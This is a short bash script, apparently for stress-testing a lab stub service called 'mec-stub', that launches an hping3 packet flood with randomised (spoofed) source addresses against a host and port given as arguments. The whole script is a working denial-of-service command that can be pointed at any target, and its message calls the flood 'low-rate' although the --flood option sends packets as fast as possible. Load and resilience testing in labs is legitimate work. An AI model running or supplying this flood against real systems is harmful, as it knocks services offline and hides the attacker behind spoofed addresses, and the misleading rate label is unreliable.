#!/bin/bash
# usage: ./dos_test.sh mec-stub 8080

TARGET_HOST=${1:-mec-stub}
TARGET_PORT=${2:-8080}

echo "[*] Starting low-rate hping3 flood towards ${TARGET_HOST}:${TARGET_PORT} (Ctrl+C to stop)"

hping3 --flood --rand-source -p "${TARGET_PORT}" "${TARGET_HOST}"
